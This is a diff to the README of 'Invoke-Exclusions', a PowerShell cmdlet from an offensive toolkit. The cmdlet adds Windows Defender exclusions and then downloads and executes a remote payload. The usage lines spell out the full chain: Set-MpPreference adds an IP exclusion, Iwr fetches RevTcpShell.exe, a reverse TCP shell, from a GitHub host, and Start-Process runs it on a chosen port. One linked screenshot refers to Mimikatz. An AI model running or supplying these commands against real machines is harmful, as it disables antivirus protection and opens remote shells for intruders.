@@ -2,7 +2,7 @@
 
 |Cmdlet name|Description|Privileges|Notes|
 |---|---|---|---|
-|[Invoke-Exclusions](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WD-Bypass/Invoke-Exclusions.ps1)|Add exclusions to Defender (Set-MpPreference) + Download\Execute -uri 'cmdlet'<br />Exclusion values accepted : **'ExclusionPath, ExclusionProcess, ExclusionExtension'**|Administrator|[Screenshot1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.png)<br />[Screenshot2](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-ExclusionsUrl.png)<br />[Screenshot3](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-ExclusionsUrlMimikarz.png)|
+|[Invoke-Exclusions](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WD-Bypass/Invoke-Exclusions.ps1)|Add exclusions to Defender (Set-MpPreference) + Download\Execute -uri 'cmdlet'<br />Types: **ExclusionPath, ExclusionProcess, ExclusionExtension, ExclusionIpAddress**|Administrator|[Screenshot1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.png)<br />[Screenshot2](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-ExclusionsUrl.png)<br />[Screenshot3](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-ExclusionsUrlMimikarz.png)|
 
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
@@ -56,9 +56,9 @@ Get-help .\Invoke-Exclusions.ps1 -Full
 
 ## CmdLet Function: Add exclusion Path + Download URI PE + Execute PE
 # 1º - Set-MpPreference -ExclusionIpAddress "192.168.1.72" -Force
-# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/.../RevTcpShell.exe" -OutFile "$Env:TMP\RevTcpShell.exe"
+# 2º - Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/RevTcpShell.exe" -OutFile "$Env:TMP\RevTcpShell.exe"
 # 3º - cd $Env:TMP; Start-Process RevTcpShell.exe
-.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionIpAddress" -Exclude "192.168.1.72" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/..../RevTcpShell.exe" 
+.\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionIpAddress" -Exclude "192.168.1.72" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/RevTcpShell.exe" -Arguments "-port 666"
 
 
 #Remove-MpPreference -ExclusionProcess "cmd" Force
